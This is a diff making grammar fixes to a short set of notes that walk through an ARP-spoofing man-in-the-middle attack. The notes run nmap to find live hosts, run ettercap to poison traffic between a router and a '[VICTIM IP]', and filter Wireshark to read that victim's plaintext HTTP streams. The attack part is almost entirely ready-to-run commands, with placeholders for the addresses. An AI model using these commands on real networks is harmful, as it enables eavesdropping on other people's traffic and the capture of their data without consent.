@@ -4,12 +4,12 @@ Nmap
 Ettercap-text-only
 --------------------------
 sudo nmap -sn [IP ADDRESS RANGE]
--sn: Disables port scanning,performs a "ping scan" only--it checks which hosts are up(alive) without scanning their ports.
+-sn: Disables port scanning, performs a "ping scan" only--it checks which hosts are up(alive) without scanning their ports.
 --------------------------
 sudo ettercap -T -S -i eth0 -M arp:remote /[ROUTER IP]// /[VICTIM IP]//
 -T: Text only
--S: Not use SSL
--i: Network interface (in my case eth0)
+-S: Do not use SSL
+-i: Network interface (in my case, eth0)
 -M: Method
 --------------------------
 sudo wireshark
@@ -17,8 +17,8 @@ sudo wireshark
 #You will see a LOT of things. So let's filter it:
 ip.addr == [VICTIM IP]
 -------------------------
-#If you right-click on a packet, and then click follow -> TCP Stream, In most cases, you will not understand anything.
-#It is because SSL/TLS (encryption).
+#If you right-click on a packet, and then click follow -> TCP Stream, in most cases, you will not understand anything.
+#It is because of SSL/TLS (encryption).
 #Let's filter it to readable (http) packets:
 ip.addr == [VICTIM IP] && http
 #Right-click on a packet, click follow -> HTTP Stream.
